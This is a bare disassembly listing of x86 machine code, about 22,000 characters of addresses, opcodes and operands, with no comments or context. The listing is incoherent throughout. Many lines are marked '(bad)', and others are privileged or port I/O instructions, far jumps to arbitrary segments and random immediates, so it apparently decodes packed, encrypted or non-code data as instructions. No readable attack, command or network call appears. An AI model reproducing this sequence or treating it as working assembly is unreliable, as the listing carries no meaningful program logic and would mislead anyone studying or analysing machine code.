  40bd61:	ror    bh,cl
  40bd63:	pop    edi
  40bd64:	push   ecx
  40bd65:	xor    edi,DWORD PTR [eax]
  40bd67:	and    esi,DWORD PTR [esi+0x25]
  40bd6a:	test   BYTE PTR [edx+0x17a63fb8],dl
  40bd70:	xlat   BYTE PTR ds:[ebx]
  40bd71:	sub    eax,0xf2af6030
  40bd76:	adc    ch,BYTE PTR [edi+0x527de1d0]
  40bd7c:	cmp    edx,0xce53a74e
  40bd82:	push   0x32
  40bd84:	lock dec ecx
  40bd86:	rcl    BYTE PTR [ebp+0x3ee7ac85],0x80
  40bd8d:	stos   BYTE PTR es:[edi],al
  40bd8e:	mov    ecx,0xa0b29d9f
  40bd93:	jne    0x40bd75
  40bd95:	dec    esi
  40bd96:	pop    ss
  40bd97:	stos   DWORD PTR es:[edi],eax
  40bd98:	retf   
  40bd99:	jp     0x40bdbc
  40bd9b:	jmp    0x707:0x61152850
  40bda2:	clc    
  40bda3:	mov    ch,0x52
  40bda5:	adc    DWORD PTR [ecx+0x7d],esp
  40bda8:	pop    es
  40bda9:	scas   eax,DWORD PTR es:[edi]
  40bdaa:	leave  
  40bdab:	or     al,0xb5
  40bdad:	mov    ah,0xa
  40bdaf:	or     DWORD PTR [ebx],0x664884c8
  40bdb5:	push   edx
  40bdb6:	mov    ecx,0x8df1c825
  40bdbb:	xchg   ebp,eax
  40bdbc:	xchg   ebp,eax
  40bdbd:	add    DWORD PTR [edi+edx*4],ebx
  40bdc0:	std    
  40bdc1:	and    BYTE PTR [ecx-0x24],bh
  40bdc4:	or     DWORD PTR [ecx],ecx
  40bdc6:	jl     0x40be25
  40bdc8:	jae    0x40bde1
  40bdca:	push   esp
  40bdcb:	mov    al,dl
  40bdcd:	fsub   DWORD PTR [edx-0x5f23dbde]
  40bdd3:	push   ebp
  40bdd4:	push   esp
  40bdd5:	push   ebp
  40bdd6:	(bad)  
  40bdd7:	pop    ss
  40bdd8:	arpl   WORD PTR [esi+eax*2],si
  40bddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bddc:	or     edx,esp
  40bdde:	(bad)  
  40bddf:	pop    edx
  40bde0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde1:	mov    ebp,0x8866060c
  40bde6:	jge    0x40be03
  40bde8:	dec    edx
  40bde9:	dec    DWORD PTR [eax+edi*1+0x49ad7caa]
  40bdf0:	hlt    
  40bdf1:	jne    0x40be52
  40bdf3:	lahf   
  40bdf4:	icebp  
  40bdf5:	xor    eax,DWORD PTR [ecx+0x390cb107]
  40bdfb:	lea    edi,[eax-0x72]
  40bdfe:	mov    eax,ds:0x88539c1b
  40be03:	pop    ebx
  40be04:	mul    DWORD PTR [ebx-0x13]
  40be07:	lods   al,BYTE PTR ds:[esi]
  40be08:	mov    al,ds:0x4625e575
  40be0d:	outs   dx,BYTE PTR ss:[esi]
  40be0f:	pushf  
  40be10:	call   0xea8b133c
  40be15:	inc    eax
  40be16:	and    ebx,ebx
  40be18:	jg     0x40be90
  40be1a:	jle    0x40bdcb
  40be1c:	div    BYTE PTR [eax+0x598afb82]
  40be22:	pop    ecx
  40be23:	pusha  
  40be24:	xlat   BYTE PTR ds:[ebx]
  40be25:	mov    esi,0x53e47339
  40be2a:	(bad)  
  40be2c:	loopne 0x40be12
  40be2e:	les    ebx,FWORD PTR [ecx]
  40be30:	push   ds
  40be31:	xor    BYTE PTR [edi+0x59],0xc4
  40be35:	shl    BYTE PTR [edi+0x1091d2e8],0x4d
  40be3c:	sti    
  40be3d:	das    
  40be3e:	clc    
  40be3f:	xchg   ebx,eax
  40be40:	fisubr DWORD PTR [eax-0x7827491e]
  40be46:	cmp    BYTE PTR [eax-0x5ae36bb8],al
  40be4c:	xlat   BYTE PTR ds:[ebx]
  40be4d:	cld    
  40be4e:	pop    ecx
  40be4f:	jge    0x40be9b
  40be51:	cmp    ah,BYTE PTR [ecx+esi*1-0x58]
  40be55:	jno    0x40be01
  40be57:	mov    ch,0x14
  40be59:	iret   
  40be5a:	jecxz  0x40be8f
  40be5c:	dec    eax
  40be5d:	js     0x40be4f
  40be5f:	sub    DWORD PTR [ebx+esi*2-0x4f],ebx
  40be63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be64:	pop    edx
  40be65:	or     bl,0x2b
  40be68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be69:	jp     0x40be5b
  40be6b:	in     al,0x6
  40be6d:	into   
  40be6e:	jp     0x40be09
  40be70:	das    
  40be71:	xor    al,0x2d
  40be73:	dec    edx
  40be74:	aad    0x6c
  40be76:	push   0xffffffa5
  40be78:	shl    BYTE PTR [ebx+eiz*8-0x1259fac8],0x4b
  40be80:	ficom  DWORD PTR [edx+0x63a59592]
  40be86:	mov    cl,0x6
  40be88:	fs fs cs adc al,0x4a
  40be8d:	popa   
  40be8e:	dec    ecx
  40be8f:	stos   DWORD PTR es:[edi],eax
  40be90:	fucom  st(7)
  40be92:	mov    al,0xb3
  40be94:	xor    eax,0x1c7b4306
  40be99:	lock mov esp,0x1531e96c
  40be9f:	add    edx,ecx
  40bea1:	push   esp
  40bea2:	add    bl,BYTE PTR [eax]
  40bea4:	sbb    DWORD PTR [edi+0x1dc9789b],ecx
  40beaa:	jle    0x40bed2
  40beac:	std    
  40bead:	fnsave [edx-0x11db4510]
  40beb3:	loopne 0x40be44
  40beb5:	in     eax,dx
  40beb6:	cmc    
  40beb7:	or     al,0xb9
  40beb9:	call   FWORD PTR [ecx-0x7b676db]
  40bebf:	mov    dl,0x18
  40bec1:	xor    DWORD PTR [esi],edi
  40bec3:	jae    0x40bef4
  40bec5:	pusha  
  40bec6:	int    0xf9
  40bec8:	int    0x2d
  40beca:	nop    DWORD PTR [ebx-0x71ef6a73]
  40bed1:	jg     0x40be57
  40bed3:	sub    DWORD PTR [esi+0x21aff884],ebx
  40bed9:	xor    esp,ebp
  40bedb:	adc    ebx,esi
  40bedd:	jae    0x40beca
  40bedf:	fidiv  WORD PTR [ebx-0x78]
  40bee2:	retf   0xa715
  40bee5:	out    0xe2,al
  40bee7:	adc    eax,0xf2ec6309
  40beec:	(bad)  
  40beed:	imul   esi,ebx,0x4a
  40bef0:	xor    al,0x1e
  40bef2:	mov    al,ds:0xad8164c9
  40bef7:	lea    ecx,[eax]
  40bef9:	ins    DWORD PTR es:[edi],dx
  40befa:	not    bl
  40befc:	(bad)  
  40befd:	nop
  40befe:	aaa    
  40beff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf00:	cdq    
  40bf01:	sbb    ah,BYTE PTR [edi+edx*8]
  40bf04:	sbb    ah,BYTE PTR [ebp+0x4a]
  40bf07:	(bad)  
  40bf08:	std    
  40bf09:	sub    ch,al
  40bf0b:	cwde   
  40bf0c:	fbstp  TBYTE PTR [ecx-0x4f]
  40bf0f:	mov    edx,0xf72e94c7
  40bf14:	(bad)  
  40bf15:	outs   dx,DWORD PTR ds:[esi]
  40bf16:	cld    
  40bf17:	pop    esi
  40bf18:	cmp    eax,0xe00fa727
  40bf1d:	inc    edi
  40bf1e:	dec    ebx
  40bf1f:	fcomp  QWORD PTR [esi]
  40bf21:	dec    edx
  40bf22:	and    BYTE PTR [edx+0xcdebee5],0x2b
  40bf29:	mov    eax,ds:0xe1c66942
  40bf2e:	or     ebp,0x98901ba9
  40bf34:	nop
  40bf35:	stos   DWORD PTR es:[edi],eax
  40bf36:	add    eax,DWORD PTR [ebx+0x23]
  40bf39:	inc    ecx
  40bf3a:	ret    0x548c
  40bf3d:	sbb    ebx,edx
  40bf3f:	xlat   BYTE PTR ds:[ebx]
  40bf40:	arpl   dx,di
  40bf42:	ja     0x40bf17
  40bf44:	test   eax,0xad87481a
  40bf49:	es stc 
  40bf4b:	and    esp,edx
  40bf4d:	bound  esp,QWORD PTR [edx+esi*1-0x38]
  40bf51:	jp     0x40bf52
  40bf53:	mov    cl,0xe0
  40bf55:	pop    DWORD PTR [ebp-0x50]
  40bf58:	jbe    0x40bfcd
  40bf5a:	inc    eax
  40bf5b:	int    0xea
  40bf5d:	inc    eax
  40bf5e:	adc    DWORD PTR [esi],esp
  40bf60:	dec    ecx
  40bf61:	data16 sub al,0x5d
  40bf64:	xor    al,BYTE PTR [edi+0x4ae888f0]
  40bf6a:	xchg   ebp,eax
  40bf6b:	mov    ch,0x9c
  40bf6d:	popf   
  40bf6e:	loop   0x40bef7
  40bf70:	pusha  
  40bf71:	das    
  40bf72:	ror    BYTE PTR [edx+0x50],1
  40bf75:	jmp    0x8ea1:0x908c4ae6
  40bf7c:	xchg   edi,eax
  40bf7d:	ror    DWORD PTR [edx+eax*8-0x4c5555d4],cl
  40bf84:	mov    fs,WORD PTR [ecx+0x10]
  40bf87:	jl     0x40bf71
  40bf89:	ins    DWORD PTR es:[edi],dx
  40bf8a:	inc    edi
  40bf8b:	add    ecx,DWORD PTR [ecx-0x4519aec3]
  40bf91:	inc    esp
  40bf92:	mov    bl,0x1d
  40bf94:	pop    ds
  40bf95:	jno    0x40bf72
  40bf97:	aam    0x56
  40bf99:	sub    eax,0x6cc15d2a
  40bf9e:	clc    
  40bf9f:	hlt    
  40bfa0:	dec    edx
  40bfa1:	test   al,0xa8
  40bfa3:	aaa    
  40bfa4:	test   BYTE PTR [eax+0x34613d98],cl
  40bfaa:	xor    ah,BYTE PTR [ebx+0x24]
  40bfad:	(bad)  
  40bfae:	out    0x21,eax
  40bfb0:	stos   BYTE PTR es:[edi],al
  40bfb1:	pop    eax
  40bfb2:	rcr    DWORD PTR [edi+0x47],0x24
  40bfb6:	out    dx,eax
  40bfb7:	add    esp,edi
  40bfb9:	hlt    
  40bfba:	inc    eax
  40bfbb:	inc    ecx
  40bfbc:	pop    edi
  40bfbd:	aam    0xf1
  40bfbf:	inc    ebp
  40bfc0:	mov    al,0xe3
  40bfc2:	push   es
  40bfc3:	xchg   esp,eax
  40bfc4:	dec    edx
  40bfc5:	rcl    DWORD PTR ds:0x93be1de9,cl
  40bfcb:	fidiv  WORD PTR [ebx+0x26]
  40bfce:	xor    ebp,DWORD PTR [esi-0x11]
  40bfd1:	fmul   QWORD PTR [ebx+0x4]
  40bfd4:	inc    ecx
  40bfd5:	sub    BYTE PTR [esp+esi*4-0x5d1af97],al
  40bfdc:	adc    edi,esp
  40bfde:	push   ebp
  40bfdf:	jecxz  0x40c05f
  40bfe1:	dec    cx
  40bfe3:	sub    esp,DWORD PTR [ebp-0x1d]
  40bfe6:	and    cl,dl
  40bfe8:	(bad)  [eax+0x3a8e5850]
  40bfee:	popf   
  40bfef:	sbb    ebp,DWORD PTR [ebp-0x19daea0e]
  40bff5:	icebp  
  40bff6:	add    al,0x17
  40bff8:	mov    ch,0xa5
  40bffa:	or     DWORD PTR [edi],esp
  40bffc:	loope  0x40bfee
  40bffe:	dec    edx
  40bfff:	ja     0x40c01b
  40c001:	pcmpeqd mm3,QWORD PTR ds:0x72c443cc
  40c008:	imul   edi,eax,0xd
  40c00b:	loope  0x40c030
  40c00d:	push   ebx
  40c00e:	add    al,0x88
  40c010:	stc    
  40c011:	sti    
  40c012:	jnp    0x40bf98
  40c014:	pop    esi
  40c015:	jecxz  0x40bfd9
  40c017:	mov    ds:0xd7215c75,eax
  40c01c:	(bad)  
  40c01d:	inc    esi
  40c01e:	in     al,0x22
  40c020:	outs   dx,DWORD PTR ds:[esi]
  40c021:	adc    DWORD PTR [eax],eax
  40c023:	in     eax,dx
  40c024:	pop    ss
  40c025:	or     BYTE PTR [ecx+0x4],bl
  40c028:	addr16 inc edx
  40c02a:	retf   0xc916
  40c02d:	sub    al,BYTE PTR [eax]
  40c02f:	or     ebx,DWORD PTR [edi-0x4d]
  40c032:	add    al,0xd7
  40c034:	inc    edi
  40c035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c036:	xchg   edi,eax
  40c037:	retf   
  40c038:	or     BYTE PTR [ecx],cl
  40c03a:	lds    esp,FWORD PTR [ebp+0x78]
  40c03d:	rol    dh,cl
  40c03f:	sub    bl,BYTE PTR [esi-0x10]
  40c042:	push   edx
  40c043:	je     0x40c026
  40c045:	cmovle eax,DWORD PTR [eax-0x56]
  40c049:	push   esi
  40c04a:	into   
  40c04b:	sbb    BYTE PTR [esp+ebp*8+0x1d952ad0],dl
  40c052:	rol    al,cl
  40c054:	push   ebx
  40c055:	push   0xd82233ac
  40c05a:	fwait
  40c05b:	icebp  
  40c05c:	aas    
  40c05d:	xor    DWORD PTR [esi+0x67],ebx
  40c060:	pop    esp
  40c061:	stc    
  40c062:	mov    ds:0xa5e66bb6,al
  40c067:	mov    ah,0xcb
  40c069:	(bad)  
  40c06a:	int3   
  40c06b:	jmp    0x40c078
  40c06d:	mov    esi,0xcf3ea29c
  40c072:	pop    edx
  40c073:	(bad)  
  40c074:	mov    edx,0x364ac84e
  40c079:	ins    BYTE PTR es:[edi],dx
  40c07a:	pop    ds
  40c07b:	clc    
  40c07c:	mov    edx,0x2b6f26b2
  40c081:	and    BYTE PTR [edi-0x4afb5b01],0x56
  40c088:	out    0x85,eax
  40c08a:	push   ds
  40c08b:	sbb    al,BYTE PTR cs:[ebx-0x16]
  40c08f:	shl    BYTE PTR ds:0xae65e223,1
  40c095:	popa   
  40c096:	mov    ah,0x27
  40c098:	out    dx,eax
  40c099:	mov    esp,0x808602a9
  40c09e:	repz add al,0x3c
  40c0a1:	inc    edx
  40c0a2:	out    dx,eax
  40c0a3:	push   ds
  40c0a4:	(bad)  
  40c0a5:	pop    ebx
  40c0a6:	jp     0x40c05b
  40c0a8:	leave  
  40c0a9:	pop    edx
  40c0aa:	dec    ecx
  40c0ab:	imul   eax,DWORD PTR ds:0x48cd098c,0x39aca765
  40c0b5:	ficom  DWORD PTR [edx-0x6c367d16]
  40c0bb:	sbb    esp,DWORD PTR [esi-0x21]
  40c0be:	and    DWORD PTR gs:[eax-0x53163fdb],0x39388fa6
  40c0c9:	iret   
  40c0ca:	mov    ds:0x5727718,al
  40c0cf:	outs   dx,DWORD PTR ds:[esi]
  40c0d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d1:	sti    
  40c0d2:	cmp    BYTE PTR [eax-0x1f],ch
  40c0d5:	mov    edx,0x6bf547ab
  40c0da:	inc    ecx
  40c0db:	fisubr WORD PTR [ecx+0x6c0596ef]
  40c0e1:	loop   0x40c117
  40c0e3:	in     eax,dx
  40c0e4:	push   ebp
  40c0e5:	pop    esp
  40c0e6:	dec    esi
  40c0e7:	ja     0x40c093
  40c0e9:	sar    DWORD PTR [edx],1
  40c0eb:	lfs    ebp,FWORD PTR [ecx]
  40c0ee:	scas   eax,DWORD PTR es:[edi]
  40c0ef:	pop    ecx
  40c0f0:	jbe    0x40c0fa
  40c0f2:	inc    esp
  40c0f3:	lock mov al,0x9e
  40c0f6:	dec    edi
  40c0f7:	sbb    al,0x72
  40c0f9:	loop   0x40c0a4
  40c0fb:	dec    ebx
  40c0fc:	jg     0x40c164
  40c0fe:	outs   dx,BYTE PTR ds:[esi]
  40c0ff:	fst    st(2)
  40c101:	or     ecx,DWORD PTR [ebx-0x32]
  40c104:	mov    eax,ds:0x170286ad
  40c109:	jo     0x40c102
  40c10b:	sbb    ah,bl
  40c10d:	icebp  
  40c10e:	cli    
  40c10f:	adc    al,0xe6
  40c111:	xchg   edx,eax
  40c112:	or     al,0xb7
  40c114:	stos   DWORD PTR es:[edi],eax
  40c115:	mov    eax,DWORD PTR [edx+0x39de8c82]
  40c11b:	add    esi,DWORD PTR [ebp-0x66]
  40c11e:	arpl   bx,di
  40c120:	pop    ecx
  40c121:	es ja  0x40c105
  40c124:	lock pusha 
  40c126:	mov    edi,0x33b464b3
  40c12b:	imul   eax,eax,0xffffffe8
  40c12e:	lea    edi,cs:[edi]
  40c131:	test   al,0x71
  40c133:	add    ch,BYTE PTR [edx-0x73]
  40c136:	scas   al,BYTE PTR es:[edi]
  40c137:	imul   esp,DWORD PTR ds:0x7464c7db,0xffffff86
  40c13e:	or     dl,dh
  40c140:	xchg   ebx,eax
  40c141:	push   eax
  40c142:	mov    dh,0xa2
  40c144:	(bad)  
  40c146:	xchg   ecx,eax
  40c147:	cmp    esp,DWORD PTR [ecx]
  40c149:	inc    edx
  40c14a:	cmp    BYTE PTR [ecx+0x51ce7b63],0xd1
  40c151:	popa   
  40c152:	cli    
  40c153:	icebp  
  40c154:	arpl   sp,bp
  40c156:	mov    eax,ds:0x35180894
  40c15b:	mov    al,bh
  40c15d:	xchg   ebp,eax
  40c15e:	mov    edx,0x7f48a2b7
  40c163:	inc    ecx
  40c164:	push   eax
  40c166:	cmp    BYTE PTR [ecx-0x42],0x27
  40c16a:	add    BYTE PTR [ecx-0x36],dh
  40c16d:	pop    ss
  40c16e:	lods   al,BYTE PTR ds:[esi]
  40c16f:	xchg   esi,eax
  40c170:	stos   DWORD PTR es:[edi],eax
  40c171:	jmp    0xfeed:0x7b7a9ed3
  40c178:	push   0x3bd88bbc
  40c17d:	xchg   ecx,eax
  40c17e:	aam    0x67
  40c180:	xchg   esi,eax
  40c181:	fiadd  WORD PTR [ecx+0x22c5c593]
  40c187:	xchg   esi,eax
  40c188:	cld    
  40c189:	adc    eax,0xf437475e
  40c18e:	pop    ds
  40c18f:	inc    ebx
  40c190:	gs jno 0x40c1c1
  40c193:	mov    bl,0x95
  40c195:	xchg   DWORD PTR [esi+edi*2+0x7b],ebp
  40c199:	addr16 clc 
  40c19b:	mov    dl,0x79
  40c19d:	mov    al,ds:0x7b16077a
  40c1a2:	xchg   ecx,eax
  40c1a3:	leave  
  40c1a4:	and    BYTE PTR [edi+0xe],dl
  40c1a7:	mov    al,0x39
  40c1a9:	jg     0x40c21f
  40c1ab:	inc    edx
  40c1ac:	mov    WORD PTR [edx+0x79],?
  40c1af:	test   al,0x55
  40c1b1:	test   al,0x9e
  40c1b3:	int    0xcc
  40c1b5:	mov    BYTE PTR [edi],bl
  40c1b7:	xchg   ecx,eax
  40c1b8:	jmp    0xb7a3:0x909c05
  40c1bf:	gs xchg ecx,eax
  40c1c1:	cwde   
  40c1c2:	(bad)  
  40c1c4:	sar    DWORD PTR [eax-0x2ca9ac2b],0xf4
  40c1cb:	sub    dh,BYTE PTR ds:0x3016767
  40c1d1:	sub    ebx,esi
  40c1d3:	fld    TBYTE PTR [edx]
  40c1d5:	jbe    0x40c1ff
  40c1d7:	fcomp  DWORD PTR [eax+0x55]
  40c1da:	cdq    
  40c1db:	mov    dh,0xe7
  40c1dd:	jmp    0xe0ef:0x3c218ed9
  40c1e4:	mov    eax,0x2d262731
  40c1e9:	out    0xdd,eax
  40c1eb:	punpckhbw mm6,QWORD PTR [ebp+0x312e9459]
  40c1f2:	push   cs
  40c1f3:	pop    ecx
  40c1f4:	das    
  40c1f5:	popf   
  40c1f6:	adc    edx,DWORD PTR [edx-0x43a4ebc4]
  40c1fc:	(bad)  
  40c1fd:	push   ebx
  40c1fe:	retf   0x6170
  40c201:	mov    ecx,0xafe9a204
  40c206:	add    ecx,DWORD PTR [ebx-0x3bfb6bb]
  40c20c:	dec    esp
  40c20d:	aaa    
  40c20e:	lds    ebx,FWORD PTR [ebp+esi*8-0x3]
  40c212:	xchg   ebp,ebp
  40c214:	inc    ebx
  40c215:	shr    DWORD PTR [eax],cl
  40c217:	fldl2t 
  40c219:	cmc    
  40c21a:	mov    WORD PTR [ebx-0x63],dx
  40c21e:	imul   esp,edi,0xffffff82
  40c221:	sub    DWORD PTR ds:0xbcd4cd56,ebp
  40c227:	fld    QWORD PTR [esi+0x6594091a]
  40c22d:	in     eax,dx
  40c22e:	push   edx
  40c22f:	sub    DWORD PTR [edx-0x36],0x78
  40c233:	sub    ah,BYTE PTR [eax-0x55c76f21]
  40c239:	push   eax
  40c23a:	cs leave 
  40c23c:	sub    esp,edx
  40c23e:	mov    bh,0xd
  40c240:	popa   
  40c241:	les    esi,FWORD PTR [ebx-0x1276e2cf]
  40c247:	mov    dh,0x22
  40c249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c24a:	(bad)  
  40c24b:	cld    
  40c24c:	iret   
  40c24d:	sub    al,0x27
  40c24f:	mov    esi,0x95d47a6a
  40c254:	mov    ah,0x96
  40c256:	mov    ebp,0xafc73d03
  40c25b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c25c:	test   eax,0xff83a2d2
  40c261:	stc    
  40c262:	je     0x40c255
  40c264:	pop    esi
  40c265:	les    edi,FWORD PTR [ebx+0x34]
  40c268:	mov    esp,0x3862bc13
  40c26d:	into   
  40c26e:	dec    ecx
  40c26f:	sar    cl,1
  40c271:	ja     0x40c1f5
  40c273:	cmp    al,0x3
  40c275:	test   esp,esi
  40c277:	outs   dx,BYTE PTR ds:[esi]
  40c278:	into   
  40c279:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c27b:	outs   dx,BYTE PTR ds:[esi]
  40c27c:	ins    DWORD PTR es:[edi],dx
  40c27d:	xor    al,0x6e
  40c27f:	sbb    al,0x37
  40c281:	loop   0x40c2b1
  40c283:	sub    eax,0xa8f3ab69
  40c288:	(bad)
  40c28b:	add    ebp,DWORD PTR [edi-0x2c92be7]
  40c291:	inc    eax
  40c292:	fadd   st,st(5)
  40c294:	xchg   ebp,eax
  40c295:	jns    0x40c2ed
  40c297:	mov    esi,edi
  40c299:	pop    es
  40c29a:	jg     0x40c2e0
  40c29c:	cmp    eax,0x1c689423
  40c2a1:	mov    cl,al
  40c2a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2a4:	mov    cs,WORD PTR [edi]
  40c2a6:	mov    bh,0x8c
  40c2a8:	mov    esp,0x858f907e
  40c2ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ae:	out    dx,eax
  40c2af:	in     al,dx
  40c2b0:	ds push ebp
  40c2b2:	fsubr  DWORD PTR [ebx+eax*4+0x19]
  40c2b6:	in     eax,dx
  40c2b7:	jmp    DWORD PTR [ecx+eiz*4+0xae2610c]
  40c2be:	push   ebp
  40c2bf:	and    cl,0xbd
  40c2c2:	(bad)  
  40c2c3:	repz mov ebp,0x29e3ad95
  40c2c9:	jae    0x40c2b3
  40c2cb:	clc    
  40c2cc:	push   eax
  40c2cd:	outs   dx,BYTE PTR ds:[esi]
  40c2ce:	cli    
  40c2cf:	jmp    0x34e6:0x9efa7307
  40c2d6:	cs and eax,0xedbb7b53
  40c2dc:	rcl    BYTE PTR [ebp-0x4176bf01],1
  40c2e2:	cmp    DWORD PTR [bx+si],ebx
  40c2e5:	push   ds
  40c2e6:	pop    ebp
  40c2e7:	jae    0x40c2e3
  40c2e9:	and    esi,DWORD PTR [ecx-0xd]
  40c2ec:	xor    BYTE PTR [ecx+0x3450f069],bh
  40c2f2:	es push ecx
  40c2f4:	mov    ch,0xa9
  40c2f6:	jge    0x40c2b6
  40c2f8:	aas    
  40c2f9:	sti    
  40c2fa:	jge    0x40c321
  40c2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2fd:	sub    BYTE PTR [ebx+ebx*4],0xa4
  40c301:	int3   
  40c302:	dec    eax
  40c303:	xchg   esp,eax
  40c304:	cmp    DWORD PTR [ecx+ecx*4],ebp
  40c307:	stos   BYTE PTR es:[edi],al
  40c308:	shl    BYTE PTR [edx],1
  40c30a:	fldenv [ebp+0x52ef131f]
  40c310:	mov    ah,0x28
  40c312:	push   ecx
  40c313:	jecxz  0x40c2f5
  40c315:	fucomi st,st(6)
  40c317:	jp     0x40c347
  40c319:	cli    
  40c31a:	fs jae 0x40c2b4
  40c31d:	(bad)  
  40c31e:	sti    
  40c31f:	or     ecx,DWORD PTR [ebx+esi*1-0x50]
  40c323:	push   ds
  40c324:	(bad)  
  40c325:	and    eax,0x28f88632
  40c32a:	popa   
  40c32b:	out    dx,al
  40c32c:	daa    
  40c32d:	dec    edx
  40c32e:	lods   al,BYTE PTR ds:[esi]
  40c32f:	push   cs
  40c330:	sar    BYTE PTR [ebx+0x3f],0xb3
  40c334:	mov    eax,0x94df2ff4
  40c339:	(bad)  
  40c33a:	xchg   ecx,eax
  40c33b:	inc    edx
  40c33c:	retf   0x4ea1
  40c33f:	inc    esi
  40c340:	cmp    DWORD PTR [ecx+edi*8+0x1],ebx
  40c344:	jmp    FWORD PTR [edi+0x78]
  40c347:	ret    0xed43
  40c34a:	(bad)  
  40c34c:	enter  0xb69d,0xa5
  40c350:	out    0x15,eax
  40c352:	popa   
  40c353:	es inc ebp
  40c355:	pop    ecx
  40c356:	bound  ecx,QWORD PTR [ecx]
  40c358:	mov    dh,0x1d
  40c35a:	jmp    0x40c3aa
  40c35c:	cmc    
  40c35d:	js     0x40c39f
  40c35f:	(bad)  
  40c360:	or     bl,ch
  40c362:	(bad)  
  40c363:	pop    ds
  40c364:	mov    eax,DWORD PTR [ebx]
  40c366:	cmp    DWORD PTR [esi+eax*8],esp
  40c369:	sub    DWORD PTR [ebx-0x489ef25e],ebp
  40c36f:	not    BYTE PTR [ecx+0x6a]
  40c372:	mov    al,0xe0
  40c374:	jns    0x40c3e2
  40c376:	push   0xffffffd4
  40c378:	sub    al,0x29
  40c37a:	in     eax,dx
  40c37b:	jne    0x40c3e9
  40c37d:	bound  eax,QWORD PTR [esi-0x62]
  40c380:	imul   esp,DWORD PTR [edi],0xffffffdf
  40c383:	mov    esp,0x672eb097
  40c388:	js     0x40c33b
  40c38a:	xchg   edx,eax
  40c38b:	lods   al,BYTE PTR ds:[esi]
  40c38c:	push   ecx
  40c38d:	and    ebp,DWORD PTR [eax+ebp*8-0x6b1d4e7c]
  40c394:	ins    DWORD PTR es:[edi],dx
  40c395:	mov    esi,0xd68b18b
  40c39a:	adc    al,0x4b
  40c39c:	xor    cl,BYTE PTR [eax+0xb]
  40c39f:	aaa    
  40c3a0:	push   0xffffffa0
  40c3a2:	iret   
  40c3a3:	dec    esp
  40c3a4:	dec    edx
  40c3a5:	std    
  40c3a6:	cwde   
  40c3a7:	mov    al,0x4d
  40c3a9:	xor    eax,0x7dbe0a05
  40c3ae:	pop    edi
  40c3af:	fcmovu st,st(1)
  40c3b1:	ds inc ecx
  40c3b3:	push   cs
  40c3b4:	mov    edi,esp
  40c3b6:	mov    WORD PTR [edx-0x6130fb11],ds
  40c3bc:	mov    ds:0x1b35d90b,al
  40c3c1:	mov    dh,0x61
  40c3c3:	inc    ecx
  40c3c4:	lock push ecx
  40c3c6:	xchg   ebx,eax
  40c3c7:	cmp    BYTE PTR [edi+0x3f],al
  40c3ca:	inc    ebx
  40c3cb:	xchg   eax,eax
  40c3cd:	popa   
  40c3ce:	pop    esi
  40c3cf:	rcl    DWORD PTR [esi],1
  40c3d1:	mov    edx,0x80741df9
  40c3d6:	bound  ecx,QWORD PTR ss:[ecx-0x53]
  40c3da:	adc    DWORD PTR [edx],eax
  40c3dc:	js     0x40c364
  40c3de:	push   cs
  40c3df:	ret    0xfc9a
  40c3e2:	mov    dh,0xe3
  40c3e4:	cs sbb ch,cl
  40c3e7:	pop    esi
  40c3e8:	pop    es
  40c3e9:	jge    0x40c45b
  40c3eb:	jmp    0x3a4c2bad
  40c3f0:	adc    esi,esp
  40c3f2:	daa    
  40c3f3:	fwait
  40c3f4:	call   0x2088:0x28e088ab
  40c3fb:	jge    0x40c3b0
  40c3fd:	or     edi,DWORD PTR [edx+edi*1+0x33a3b06d]
  40c404:	scas   eax,DWORD PTR es:[edi]
  40c405:	push   eax
  40c406:	and    eax,0xfcc247bc
  40c40b:	ins    BYTE PTR es:[edi],dx
  40c40c:	sar    DWORD PTR [edx],cl
  40c40e:	(bad)  
  40c40f:	push   esi
  40c410:	push   cs
  40c411:	xlat   BYTE PTR ds:[ebx]
  40c412:	pop    es
  40c413:	lods   al,BYTE PTR ds:[esi]
  40c414:	test   BYTE PTR [eax-0x4081dc4c],ah
  40c41a:	xchg   edx,eax
  40c41b:	ror    DWORD PTR [ecx+ebp*2+0x2f],0x9e
  40c420:	pop    edi
  40c421:	adc    al,0x50
  40c423:	js     0x40c4a0
  40c425:	(bad)
  40c428:	mov    esi,0x83cf6db7
  40c42d:	push   ss
  40c42e:	test   DWORD PTR [edi-0x4d0b415f],edx
  40c434:	sbb    eax,0x20138664
  40c439:	outs   dx,BYTE PTR ds:[esi]
  40c43a:	mul    BYTE PTR [ebx+0x6dc3de67]
  40c440:	adc    BYTE PTR [ebx-0x6c],bl
  40c443:	inc    esp
  40c444:	and    eax,0xb4b0e14d
  40c449:	or     eax,0xa787bd0f
  40c44e:	ja     0x40c433
  40c450:	sub    eax,0xc2a5053e
  40c455:	dec    edx
  40c456:	fsubr  QWORD PTR [esi]
  40c458:	ins    DWORD PTR es:[edi],dx
  40c459:	xor    al,0x57
  40c45b:	cmp    DWORD PTR [ebx-0x1e],ebx
  40c45e:	mov    DWORD PTR [ecx],esp
  40c460:	xchg   ebx,eax
  40c461:	cmp    dl,BYTE PTR [ecx+ecx*1]
  40c464:	pop    es
  40c465:	(bad)  
  40c466:	aaa    
  40c467:	xor    ecx,DWORD PTR [edx-0x35ce3a95]
  40c46d:	std    
  40c46e:	mov    edi,0xf0c8bfbf
  40c473:	call   0x518bb519
  40c478:	and    BYTE PTR [eax+0x4e5b747d],dl
  40c47e:	fimul  WORD PTR ds:0xbd678ad4
  40c484:	add    al,0xc9
  40c486:	add    eax,edx
  40c488:	sub    al,0xb5
  40c48a:	push   es
  40c48b:	mov    ah,bh
  40c48d:	push   0x1f8b4e75
  40c492:	cmp    al,0xfe
  40c494:	into   
  40c495:	dec    ebx
  40c496:	cmp    BYTE PTR [ebx+0x520fff1f],ah
  40c49c:	push   ecx
  40c49d:	gs out 0xfc,al
